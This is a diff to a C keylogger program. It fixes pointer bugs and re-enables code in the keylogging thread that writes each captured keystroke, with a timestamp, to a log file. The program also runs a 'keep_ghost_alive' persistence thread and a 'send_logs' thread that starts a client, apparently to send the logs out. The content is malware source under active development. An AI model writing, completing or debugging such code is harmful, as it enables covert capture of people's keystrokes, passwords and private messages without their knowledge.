@@ -66,8 +66,8 @@ int main(int argc, char **argv)
     }
     setbuf(keylog_log, NULL);
     
-    struct loginfo *k_loginfo = {keylog_log,NEVER_WRITTEN, 4 };
-    struct keylog_print keylog_print_1 = {k_loginfo , config };
+    struct loginfo k_loginfo = {keylog_log,NEVER_WRITTEN, 4 };
+    struct keylog_print keylog_print_1 = {&k_loginfo , config };
 
     
     /*Create threads*/
@@ -78,7 +78,7 @@ int main(int argc, char **argv)
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
     
     pthread_t keylog;
-    pthread_create(&keylog, &attr, start_keylogging, (void *)&keylog_print_1);
+    pthread_create(&keylog, &attr, start_keylogging, &keylog_print_1);
     
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
@@ -263,11 +263,9 @@ void* start_keylogging(void *args)
                 }
                 char *name = get_key_text(event.code, shift_pressed);
                 if (strcmp(name, "\0") != 0) {
-                    /*
+                    
                    timestamped_write(keylog_print_1.k_loginfo, name);
                    timestamped_write(keylog_print_1.k_loginfo, "\n");
-                    */
-                    fprintf(keylog_print_1.)
                     
                 }
             } else if (event.value == KEY_RELEASE) {
@@ -285,3 +283,4 @@ void* send_logs()
     start_client();
     return EXIT_SUCCESS;
 }
+
